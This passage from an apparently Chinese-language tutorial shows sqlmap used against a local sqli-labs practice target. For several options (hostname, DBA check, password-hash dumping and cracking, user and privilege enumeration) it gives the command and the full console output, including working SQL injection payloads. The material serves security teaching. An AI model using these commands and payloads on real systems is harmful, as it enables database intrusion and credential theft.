[08:08:24] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[08:08:24] [INFO] testing if the target URL content is stable                                                                                             
[08:08:25] [INFO] target URL content is stable                                                                                                            
[08:08:25] [INFO] testing if GET parameter 'id' is dynamic                                                                                                
[08:08:25] [INFO] GET parameter 'id' appears to be dynamic                                                                                                
[08:08:25] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')                                       
[08:08:25] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks                            
[08:08:25] [INFO] testing for SQL injection on GET parameter 'id'                                                                                         
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y                                          
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y                           
[08:08:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                              
[08:08:25] [WARNING] reflective value(s) found and filtering out                                                                                          
[08:08:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")                   
[08:08:25] [INFO] testing 'Generic inline queries'                                                                                                        
[08:08:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[08:08:25] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[08:08:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[08:08:25] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[08:08:25] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[08:08:25] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[08:08:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[08:08:26] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                    
[08:08:26] [INFO] testing 'MySQL inline queries'                                                                                                          
[08:08:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[08:08:26] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                   
[08:08:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[08:08:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[08:08:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[08:08:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[08:08:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[08:08:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[08:08:36] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
[08:08:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[08:08:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[08:08:36] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test                                                                                       
[08:08:36] [INFO] target URL appears to have 3 columns in query                                                                                           
[08:08:36] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                         
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:                                                                   
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 9283=9283 AND 'AIxZ'='AIxZ                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 3076 FROM(SELECT COUNT(*),CONCAT(0x71716a7171,(SELECT (ELT(3076=3076,1))),0x7176627671,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'gPam'='gPam                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 5610 FROM (SELECT(SLEEP(5)))XQPi) AND 'htpv'='htpv                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-8412' UNION ALL SELECT NULL,CONCAT(0x71716a7171,0x4e5372724d6664566561576e72696e5a786c45746d6272656d4672555a4d53645164444a516b424f,0x7176
627671),NULL-- -                                                                                                                                          
---                                                                                                                                                       
[08:08:36] [INFO] the back-end DBMS is MySQL                                                                                                              
[08:08:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
[08:08:36] [INFO] fetching current database                                                                                                               
current database: 'security'                                                                                                                              
[08:08:36] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 08:08:36 /2020-03-02/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

### 3.sqlmap检索DBMS当前主机名

参数：
`--hostname`
获取主机名。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --hostname
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:10:10 /2020-03-02/

[08:10:10] [INFO] testing connection to the target URL
[08:10:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:10:10] [INFO] testing if the target URL content is stable
[08:10:11] [INFO] target URL content is stable
[08:10:11] [INFO] testing if GET parameter 'id' is dynamic
[08:10:11] [INFO] GET parameter 'id' appears to be dynamic
[08:10:11] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[08:10:11] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[08:10:11] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[08:10:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:10:15] [WARNING] reflective value(s) found and filtering out
[08:10:15] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[08:10:15] [INFO] testing 'Generic inline queries'
[08:10:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[08:10:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[08:10:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[08:10:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[08:10:16] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[08:10:16] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[08:10:16] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:10:16] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[08:10:16] [INFO] testing 'MySQL inline queries'
[08:10:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[08:10:16] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[08:10:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[08:10:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[08:10:16] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[08:10:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[08:10:16] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[08:10:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:10:26] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[08:10:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:10:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:10:26] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:10:26] [INFO] target URL appears to have 3 columns in query
[08:10:26] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 8829=8829 AND 'CItZ'='CItZ

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 6534 FROM(SELECT COUNT(*),CONCAT(0x716b6b7071,(SELECT (ELT(6534=6534,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'tjcT'='tjcT

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6137 FROM (SELECT(SLEEP(5)))letJ) AND 'jYdS'='jYdS

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-8869' UNION ALL SELECT NULL,NULL,CONCAT(0x716b6b7071,0x777343746755676f4b4974717474594e46587845486261664a52736a75594c6b54474e6b69555659,0x71716a6271)-- -
---
[08:11:14] [INFO] the back-end DBMS is MySQL
[08:11:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[08:11:14] [INFO] fetching server hostname
hostname: 'LAPTOP-61GNXXXX'
[08:11:14] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:11:14 /2020-03-02/

                                                                                                                                                   
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081
```

显示主机名为**LAPTOP-61GNXXXX**。

### 4.sqlmap检索DBMS用户信息

#### sqlmap探测当前用户是否是DBA

参数：
`--is-dba`
探测当前用户是否是数据库管理员。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --is-dba
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:14:43 /2020-03-02/

[08:14:43] [INFO] testing connection to the target URL
[08:14:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:14:43] [INFO] testing if the target URL content is stable
[08:14:44] [INFO] target URL content is stable
[08:14:44] [INFO] testing if GET parameter 'id' is dynamic
[08:14:44] [INFO] GET parameter 'id' appears to be dynamic
[08:14:44] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[08:14:44] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[08:14:44] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[08:14:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:14:46] [WARNING] reflective value(s) found and filtering out
[08:14:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[08:14:46] [INFO] testing 'Generic inline queries'
[08:14:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[08:14:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[08:14:47] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[08:14:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[08:14:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[08:14:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[08:14:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[08:14:47] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[08:14:47] [INFO] testing 'MySQL inline queries'
[08:14:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[08:14:47] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)
[08:14:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[08:14:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[08:14:47] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[08:14:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[08:14:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[08:14:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:14:57] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[08:14:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:14:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:14:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:14:57] [INFO] target URL appears to have 3 columns in query
[08:14:57] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]

sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:15:00] [INFO] the back-end DBMS is MySQL
[08:15:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[08:15:00] [INFO] testing if current user is DBA
[08:15:00] [INFO] fetching current user
current user is DBA: True
[08:15:00] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:15:00 /2020-03-02/

                                                                                                                                 
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283
```

显示当前用户是DBA为True，因为当前用户为root，具有管理员权限。

#### sqlmap枚举DBMS用户密码

参数：
`--passwords`
Sqlmap会先列举用户，再列举用户密码Hash值。
该功能稍微有点鸡肋。

进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --password
1
```

打印

```shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:19:41 /2020-03-02/

[08:19:42] [INFO] resuming back-end DBMS 'mysql'
[08:19:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:19:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:19:42] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[08:19:48] [INFO] writing hashes to a temporary file 'xxxxx\sqlmaphashes-us74yp3p.txt'
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q]

[08:19:51] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file 'xxxxxx\sqlmapproject-sqlmap-0605f14\data\txt\wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>

[08:20:01] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]

[08:21:25] [INFO] starting dictionary-based cracking (mysql_passwd)
[08:21:25] [INFO] starting 8 processes
[' for user '08:21:46root] ['FO] cracked password '] current status: 2arxd... -root
[INFO08:21:49] cracked password '] [rootINFO' for user '] current status: 50519... |root'
database management system users password hashes:
[*] xxxxxx [1]:
    password hash: *81F5E21E35407D884A6CD4A731AEBFB6XXXXXXXX
    clear-text password: xxxxxxxx

[08:22:23] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 08:22:23 /2020-03-02/

                                                                                                                 
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263
```

显然，探测出了hash密码和原明文密码。

#### sqlmap枚举DBMS用户

参数：
`--users`
获取DBMS所有用户。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --users
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 08:28:07 /2020-03-02/                                                                                                                      
                                                                                                                                                          
[08:28:07] [INFO] resuming back-end DBMS 'mysql'                                                                                                          
[08:28:07] [INFO] testing connection to the target URL                                                                                                    
sqlmap resumed the following injection point(s) from stored session:                                                                                      
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0
x71786a7071)-- -                                                                                                                                          
---                                                                                                                                                       
[08:28:07] [INFO] the back-end DBMS is MySQL                                                                                                              
back-end DBMS: MySQL >= 5.0                                                                                                                               
[08:28:07] [INFO] fetching database users                                                                                                                 
[08:28:07] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:07] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
[08:28:08] [INFO] retrieved: ''root'@'localhost''                                                                                                         
database management system users [1]:                                                                                                                     
[*] 'root'@'localhost'                                                                                                                                    
                                                                                                                                                          
[08:28:08] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 08:28:08 /2020-03-02/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                  
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374
```

探测出一个用户。

#### sqlmap枚举DBMS权限

参数：
`--privileges`
当前用户有读取数据库管理系统中用户信息的系统表的权限时，使用这一参数可以列举数据库管理系统中用户的权限，通过用户权限可以判断哪些用户是管理员。
若想只枚举特定用户的权限使用参数`-U`指定用户，可用`-CU`来代表当前用户。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1 --priviledges -U root
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:33:51 /2020-03-02/

[08:33:52] [INFO] resuming back-end DBMS 'mysql'
[08:33:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 2962=2962 AND 'UWCI'='UWCI

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 3197 FROM(SELECT COUNT(*),CONCAT(0x7178716a71,(SELECT (ELT(3197=3197,1))),0x71786a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'OKvt'='OKvt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7043 FROM (SELECT(SLEEP(5)))bunr) AND 'kqMl'='kqMl

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5250' UNION ALL SELECT NULL,NULL,CONCAT(0x7178716a71,0x5953556e50546e68664e6b69504356704b4b764a704759624e794e4c5a71584c56624547576b5a66,0x71786a7071)-- -
---
[08:33:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[08:33:52] [INFO] fetching database users privileges
[08:33:52] [INFO] retrieved: ''root'@'localhost'','SELECT'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','INSERT'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','UPDATE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','DELETE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','CREATE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','DROP'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','RELOAD'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','SHUTDOWN'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','PROCESS'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','FILE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','REFERENCES'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','INDEX'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','ALTER'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','SHOW DATABASES'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','SUPER'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','CREATE TEMPORARY TABLES'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','LOCK TABLES'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','EXECUTE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','REPLICATION SLAVE'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','REPLICATION CLIENT'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','CREATE VIEW'
[08:33:52] [INFO] retrieved: ''root'@'localhost'','SHOW VIEW'
[08:33:53] [INFO] retrieved: ''root'@'localhost'','CREATE ROUTINE'
[08:33:53] [INFO] retrieved: ''root'@'localhost'','ALTER ROUTINE'
[08:33:53] [INFO] retrieved: ''root'@'localhost'','CREATE USER'
[08:33:53] [INFO] retrieved: ''root'@'localhost'','EVENT'
